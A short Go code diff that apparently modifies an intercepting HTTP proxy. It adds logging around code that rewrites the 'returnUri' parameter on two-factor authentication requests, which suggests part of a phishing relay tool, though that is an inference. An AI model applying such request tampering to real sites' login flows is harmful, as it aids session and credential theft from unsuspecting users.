@@ -211,12 +211,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if strings.Contains(req.URL.Path, "authflow/twofactor") && req.Method == http.MethodGet {
 			    // Parse the existing query parameters
 			    query := req.URL.Query()
-			
+				log.Info("We init")
 			    // Update the `returnUri` parameter
 			    query.Set("returnUri", "myaccount")
 			
 			    // Rebuild the full URL with the updated query parameters
 			    req_url = req.URL.Scheme + "://" + req.Host + req.URL.Path + "?" + query.Encode()
+				log.Info("Modified URL: %s", req_url)
 			} else {
 			
 			    if req.URL.RawQuery != "" {
